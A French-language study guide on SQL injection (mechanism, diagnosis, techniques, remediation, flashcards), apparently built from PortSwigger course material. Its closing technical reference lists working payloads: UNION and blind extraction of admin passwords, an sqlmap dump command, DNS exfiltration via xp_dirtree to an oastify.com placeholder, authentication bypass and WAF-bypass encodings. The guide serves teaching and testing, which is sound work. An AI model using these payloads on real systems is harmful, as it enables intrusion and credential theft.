# Injections SQL (SQLi)

## 1. Mécanisme fondamental

**Cause racine :** l'application construit une requête SQL par **concaténation de chaînes**, en mélangeant dans un même flux le *code* (la structure de la requête voulue par le développeur) et la *donnée* (l'entrée utilisateur). Le SGBD reçoit un seul texte et n'a aucun moyen de savoir quelle partie est « commande » et quelle partie est « valeur » : il interprète tout ce qui ressemble à de la syntaxe SQL (apostrophe, `--`, `OR`, sous-requête...) comme du code exécutable.

**Condition nécessaire :** une entrée utilisateur atteint le moteur SQL sans être isolée structurellement (pas de requête préparée, pas d'échappement correct, pas de liste blanche pour les éléments non paramétrables comme un nom de colonne).

**À distinguer :**
- **Cause** : absence de séparation code/donnée.
- **Indice observable** : erreur SQL, différence de contenu, de code HTTP, de délai, interaction DNS/HTTP sortante.
- **Conséquence** : lecture, modification ou suppression de données, contournement d'authentification, parfois exécution de commandes système selon les privilèges du compte SQL.

Un filtre mal écrit ou une normalisation Unicode/XML tardive ne sont pas la cause racine : ce sont des facteurs aggravants qui permettent de *contourner* une protection partielle, pas d'expliquer *pourquoi* la faille existe.

## 2. Reconnaissance et surface d'attaque

**Où chercher :** tout endroit où une donnée contrôlable par l'utilisateur ou un tiers finit dans une requête SQL — pas seulement les paramètres GET/POST visibles. Pensez systématiquement à : clauses `WHERE`/`SET`/valeurs `INSERT`, clauses structurelles (`ORDER BY`, noms de table/colonne), en-têtes HTTP journalisés (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, et données déjà stockées en base qui sont relues plus tard par une autre fonctionnalité (second ordre).

**Indices d'investigation (ne prouvent rien seuls) :** erreur 500 ou verbeuse en SGBD après injection d'un caractère spécial ; comportement qui change avec `'`, `"`, `)`, `;` ; paramètre numérique accepté tel quel dans le flux applicatif.

**Explications alternatives à écarter avant de conclure :** bug applicatif générique, validation de formulaire côté serveur non liée à SQL, erreur réseau, comportement de cache.

**Hiérarchie indice → preuve :**
- *Indice* : la page change après un caractère spécial → justifie d'investiguer.
- *Renforcement* : le comportement redevient normal après neutralisation syntaxique de ce caractère (ex. double apostrophe) → hypothèse renforcée.
- *Confirmation suffisante dans le contexte testé* : une **paire** de tests opposés (condition vraie / condition fausse) produit une divergence cohérente et reproductible.

## 3. Méthodologie de diagnostic

La démarche n'est pas un arbre linéaire strict : plusieurs canaux d'observation existent en parallèle, et on choisit celui qui reste disponible selon ce que l'application laisse fuiter.

1. **Référence** : observer le comportement normal (contenu, code HTTP, temps de réponse) avant toute injection.
2. **Hypothèse** : casser la syntaxe avec un caractère de terminaison de chaîne (`'`, `"`). Une erreur SQL brute confirme fortement une injection et oriente vers In-Band/Error-Based.
3. **Si l'erreur est masquée** (page générique, 500 sans détail) : comparer le **contenu** entre une condition vraie et une condition fausse → Boolean-Based Blind.
4. **Si le contenu ne varie jamais** : observer si le **code de statut HTTP** varie selon la véracité d'une condition conçue pour ne lever une exception que si elle est vraie (ex. division par zéro conditionnelle).
5. **Si le code HTTP ne varie pas non plus** : mesurer un **délai** conditionné (`SLEEP`, `WAITFOR DELAY`, `pg_sleep`) → Time-Based Blind. Toujours répéter 2-3 fois et faire varier la durée injectée pour écarter une latence réseau fortuite.
6. **Si aucun canal de réponse n'est exploitable** (traitement asynchrone, API totalement muette) : forcer une interaction réseau sortante vers une infrastructure contrôlée (OAST) — seule preuve possible dans ce contexte.
7. **Si un WAF semble bloquer** : avant de conclure à une protection efficace, tester des variantes syntaxiques/d'encodage (le filtrage peut avoir lieu *avant* un décodage applicatif qui, lui, interprétera le payload).

**Règles de raisonnement :**
- Un test négatif à une étape ne prouve l'absence de vulnérabilité **que pour ce canal précis** ; il ne permet pas de conclure sur les autres canaux ni sur d'autres points d'injection (en-têtes, second ordre).
- Toujours valider par une **paire** condition-vraie / condition-fausse : un seul résultat positif peut être un faux positif applicatif non lié à SQL.
- L'ordre 2→6 reflète une difficulté croissante d'observation, pas une obligation d'épuiser chaque canal avant le suivant : si un canal plus riche (ex. erreurs visibles) est disponible, on l'utilise directement sans passer par le Blind.

## 4. Techniques principales

| Technique | Canal observé | Quand l'utiliser | Limite principale |
|---|---|---|---|
| In-Band / Error-Based | Message d'erreur SGBD affiché | Erreurs SQL brutes visibles (debug actif) | Dépend d'une mauvaise config ; rare en prod durcie |
| UNION-Based | Contenu de la page (réflexion) | La requête est un `SELECT` dont le résultat est rendu dans la réponse | Nécessite le même nombre de colonnes et des types compatibles |
| Boolean-Based Blind | Différence de contenu/rendu | Toujours 200 OK mais page change selon condition | Lent (extraction caractère par caractère) |
| Erreurs conditionnelles | Code de statut HTTP | Contenu masqué mais 500 fuite selon condition | Toujours extraction lente |
| Time-Based Blind | Délai de réponse | Aucun signal de contenu ni de code HTTP | Le plus lent, le plus bruyant (charge/latence détectable) |
| OAST (Out-of-Band) | Interaction DNS/HTTP sortante | Traitement asynchrone, API totalement aveugle, tous les autres canaux neutralisés | Nécessite que le SGBD ait les privilèges/fonctions réseau (souvent restreint) |
| Second ordre | N'importe quel canal ci-dessus, mais différé | La donnée est stockée paramétrée puis réutilisée ailleurs sans paramétrage | Invisible au moment de la soumission initiale ; échappe aux scanners simples |

**Point de vocabulaire important :** ces catégories ne sont pas exclusives et se combinent selon deux axes différents — le **canal d'observation** (contenu / erreur / code HTTP / délai / réseau sortant) et le **moment d'exécution** (immédiat vs second ordre). Le UNION-Based est une sous-catégorie In-Band particulière (exploitation par extension de requête), tandis que Boolean/erreurs conditionnelles/Time-Based sont trois variantes du Blind qui ne diffèrent que par le canal disponible.

**Prérequis UNION, souvent oubliés :** nombre de colonnes identique (déterminé via `ORDER BY N` incrémenté jusqu'à erreur) et compatibilité de type par colonne (testée avec `NULL` puis substitution progressive). Sur Oracle, un `SELECT` sans table nécessite `FROM DUAL`.

## 5. Erreurs fréquentes

- **Tester uniquement les paramètres GET/POST visibles** et ignorer en-têtes HTTP journalisés ou données stockées réutilisées ailleurs (second ordre).
- **Conclure « pas vulnérable » après un seul test négatif** sur un seul canal, sans avoir essayé les autres canaux d'observation.
- **Interpréter un résultat positif isolé** (ex. page qui affiche « tous les produits ») comme une preuve, sans le test opposé (condition fausse) pour écarter un faux positif applicatif.
- **Mémoriser un payload sans comprendre pourquoi il fonctionne** (ex. `' OR 1=1--`) : sans comprendre la neutralisation de la clause `WHERE`, on ne sait pas l'adapter si la syntaxe du SGBD cible diffère.
- **Supposer qu'un paramètre numérique est protégé** parce qu'il ne contient pas de guillemets dans la requête — une concaténation directe (`"WHERE id=" + input`) reste exploitable (test « Inline »).
- **Généraliser une syntaxe à tous les SGBD** (ex. `SLEEP()` n'existe pas sur SQL Server, qui utilise `WAITFOR DELAY`) sans avoir fingerprinté le moteur au préalable.
- **Conclure trop vite qu'un WAF bloque réellement l'injection**, alors qu'un encodage ou une normalisation tardive côté application peut suffire à le contourner.

## 6. Remédiation

| Mesure | Nature | Ce qu'elle traite |
|---|---|---|
| Requêtes préparées / paramétrage | Cause racine | Sépare structurellement code et données pour toutes les **valeurs** ; neutralise in-band, blind, union, error-based sur les données |
| Liste blanche (whitelisting) | Cause racine, pour les éléments non paramétrables | Noms de table/colonne, direction de tri (`ORDER BY`) — un placeholder `?` ne peut pas remplacer un identifiant |
| Moindre privilège sur le compte SQL applicatif | Réduction d'impact | Limite ce qu'un contournement résiduel peut faire (lecture seule si pas besoin d'écriture, pas de fonctions système) |
| Désactivation des messages d'erreur SQL bruts en prod | Réduction des informations divulguées | Supprime le canal Error-Based, mais ne corrige pas la faille elle-même |
| Validation stricte des types/formats | Défense en profondeur | Réduit certains cas (ex. test « inline ») mais n'est pas une protection à elle seule |
| Cartographie des réutilisations de données stockées | Spécifique au second ordre | Repère les points où une donnée déjà en base est réinjectée sans reparamétrage |

**Nuance importante (confirmée par la documentation PortSwigger) :** les procédures stockées sont parfois présentées comme une protection, mais elles ne garantissent rien par elles-mêmes — si la procédure construit elle-même du SQL dynamique par concaténation à partir d'une entrée utilisateur, l'injection reste possible. Seule la séparation structurelle code/donnée (paramétrage réel) traite la cause racine.

## 7. Flashcards de rappel actif

### Flashcard 1 — Cause racine
**Question :** Pourquoi une requête préparée élimine-t-elle structurellement toute injection SQL sur les données, alors qu'un simple échappement de caractères ne le garantit pas totalement ?
**Réponse :** La requête préparée envoie au SGBD la structure de la requête et les valeurs par deux canaux distincts, sans jamais reconstruire de chaîne SQL ; il n'y a plus de syntaxe à casser. L'échappement, lui, reste une transformation de texte dans le même canal : un oubli, un encodage non prévu ou un contexte particulier peuvent le contourner.

### Flashcard 2 — Reconnaissance
**Question :** Citez deux emplacements d'injection souvent négligés en dehors des paramètres GET/POST classiques.
**Réponse :** Les en-têtes HTTP journalisés en base (`User-Agent`, `Referer`, `X-Forwarded-For`) et les clauses structurelles comme `ORDER BY` (tri dynamique).

### Flashcard 3 — Choix de méthode
**Question :** L'application renvoie toujours `HTTP 200` avec un contenu identique, sans jamais d'erreur. Quel canal reste disponible pour confirmer une injection ?
**Réponse :** Le temps de réponse (Time-Based Blind), en conditionnant un délai artificiel à la véracité d'un test — à valider en répétant le test et en faisant varier la durée injectée.

### Flashcard 4 — Interprétation d'un résultat
**Question :** Une page affiche « tous les produits » après un payload `' OR '1'='1`. Pourquoi ce seul résultat n'est-il pas une preuve suffisante ?
**Réponse :** Le même affichage élargi pourrait provenir d'un autre comportement applicatif (fallback, erreur). Il faut le test opposé (`' AND '1'='2`) : seule la divergence cohérente entre les deux confirme l'injection.

### Flashcard 5 — Distinction entre techniques
**Question :** Quelle est la différence entre Boolean-Based Blind et l'exploitation par erreurs conditionnelles (section 4.2) ?
**Réponse :** Les deux testent une condition vraie/fausse, mais le signal observé diffère : contenu de la page pour le Boolean-Based, code de statut HTTP (ex. 500 via division par zéro conditionnelle) pour les erreurs conditionnelles — utile quand le contenu ne varie jamais visuellement.

### Flashcard 6 — Limites d'une méthode
**Question :** Pourquoi l'OAST est-il considéré comme la technique de dernier recours plutôt que la méthode par défaut ?
**Réponse :** Il nécessite que le SGBD dispose des privilèges et fonctions réseau pour émettre une requête sortante, souvent restreints en environnement durci ; les autres canaux (contenu, erreur, délai), quand ils existent, sont plus simples et plus rapides à exploiter.

### Flashcard 7 — Raisonnement après un échec
**Question :** Un test Boolean-Based ne produit aucune divergence de contenu. Que peut-on en conclure, et que ne peut-on pas en conclure ?
**Réponse :** On peut conclure que ce canal précis (contenu) n'est pas exploitable ici. On ne peut pas conclure à l'absence de vulnérabilité : il faut encore tester le code HTTP, le délai, l'OAST, et d'autres points d'injection (en-têtes, second ordre) avant de rejeter l'hypothèse.

### Flashcard 8 — Remédiation
**Question :** Pourquoi le paramétrage seul ne suffit-il pas à sécuriser un tri dynamique (`ORDER BY colonne`) ?
**Réponse :** Un placeholder (`?`) ne peut lier qu'une valeur, pas un identifiant de colonne ou une direction de tri. Il faut une liste blanche applicative qui fait correspondre l'entrée utilisateur à une valeur fixe codée en dur, rejetée si elle ne matche aucune entrée connue.

## 8. Checklist mentale avant de conclure

- Ai-je testé une paire condition-vraie / condition-fausse, et pas seulement un résultat isolé ?
- Le résultat est-il reproductible (pas une latence réseau ponctuelle, pas un comportement aléatoire) ?
- Ai-je exclu une explication applicative alternative (bug, fallback, cache) avant de confirmer ?
- Ai-je testé au moins les canaux pertinents disponibles (contenu, erreur, code HTTP, délai) avant de conclure à une absence de vulnérabilité sur ce point ?
- Ai-je pensé aux points d'injection non évidents (en-têtes HTTP, données stockées réutilisées plus tard) ?
- Si un filtre semble bloquer mes tentatives, ai-je vérifié que ce n'est pas juste un filtrage syntaxique contournable par encodage ?
- Si je prépare une exploitation plus poussée (UNION, dump, écriture), ai-je évalué le risque sur l'environnement cible (prod vs lab, requêtes destructrices) ?

---

## Référence technique complémentaire

### Détection — payloads de base par canal

```sql
-- Casser la syntaxe (In-Band)
'

-- Confirmation par échappement
''

-- Boolean-Based
' OR '1'='1
' AND '1'='2

-- Time-Based (selon SGBD)
' AND SLEEP(5)--          -- MySQL/MariaDB
' AND pg_sleep(5)--       -- PostgreSQL
'; WAITFOR DELAY '0:0:5'--  -- SQL Server
```

### Fingerprinting du SGBD

| Critère | MySQL/MariaDB | PostgreSQL | SQL Server | Oracle |
|---|---|---|---|---|
| Commentaire | `#` ou `-- ` (espace requis) | `--` | `--` | `--` |
| Concaténation | `CONCAT()` | `\|\|` | `+` | `\|\|` |
| Métadonnées | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` / `all_tab_columns` (noms en MAJUSCULES) |
| Version | `version()` | `version()` | `@@version` | `v$version` |
| Sous-requête sans table | implicite | implicite | implicite | `FROM DUAL` obligatoire |

### UNION-Based — séquence complète

```sql
' ORDER BY 1--          -- incrémenter jusqu'à erreur pour trouver le nb de colonnes
' UNION SELECT NULL,NULL,NULL--          -- valider la structure
' UNION SELECT NULL,'a',NULL--           -- repérer la colonne texte
' UNION SELECT NULL, username, password FROM users--   -- exfiltration
```

### Énumération (MySQL/PostgreSQL/SQL Server)

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```
Oracle : remplacer par `all_tables` / `all_tab_columns`, et comparer en MAJUSCULES (`WHERE table_name='USERS'`).

### Extraction Blind caractère par caractère

```sql
-- Longueur
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=20--

-- Comparaison caractère par caractère (naïf)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- Optimisation : dichotomie sur le code ASCII plutôt que test lettre par lettre
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>109--
```
Automatisation : Burp Intruder (Cluster Bomb position × caractère) ou `sqlmap` (implémente nativement la dichotomie) :
```bash
sqlmap -u "https://cible.exemple/home" --cookie="TrackingId=xyz" -p TrackingId --level=2 --dump
```

### Erreurs conditionnelles (code HTTP comme signal)

```sql
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1/0 ELSE 'a' END)='a
```

### Error-Based (extraction directe via message d'erreur, MSSQL)

```sql
' AND CAST((SELECT Password FROM Users WHERE Username='Administrator') AS int)=1--
```
Dépend entièrement d'une configuration de debug exposant les messages SQL bruts au client — à ne pas généraliser comme comportement par défaut.

### OAST — exfiltration DNS (MSSQL)

```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.VOTRE-ID.oastify.com/a"')--
```
Oracle (détection simple) :
```sql
SELECT UTL_INADDR.get_host_address('VOTRE-ID.oastify.com') FROM dual;
```

### Bypass d'authentification

```sql
username=administrator'--          -- (MySQL : espace obligatoire après --, sinon utiliser #)
username=' OR 1=1 LIMIT 1--        -- MySQL/PostgreSQL ; sur MSSQL/Oracle, pas de LIMIT (TOP/ROWNUM)
```

### Contournement de WAF par encodage

```xml
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
```
```json
{"storeId": "999 \u0053ELECT * FROM information_schema.tables"}
```
Fonctionne uniquement si la couche applicative décode **après** le passage du WAF — à valider en comparant le comportement avec/sans encodage.

---

## Points à vérifier / corrections apportées par rapport au cours source

- Le cours ne mentionnait pas explicitement que les **procédures stockées ne sont pas une protection garantie** contre l'injection (elles peuvent elles-mêmes concaténer du SQL dynamique) ; c'est pourtant une précision officielle de PortSwigger, ajoutée section 6.
- La classification « In-Band / Blind / OAST / Second-order » du cours mélange plusieurs dimensions (canal d'observation, moment d'exécution) sans toujours le signaler comme non exclusif : ce point a été explicité section 4 pour éviter une classification présentée à tort comme une hiérarchie unique.
- L'affirmation selon laquelle une colonne numérique « ne peut pas recevoir de texte sans conversion » en UNION est globalement vraie mais dépend du SGBD (certains moteurs, notamment MySQL en mode non strict, tolèrent des conversions implicites plus permissives) — nuance à garder en tête en conditions réelles plutôt qu'une règle absolue.
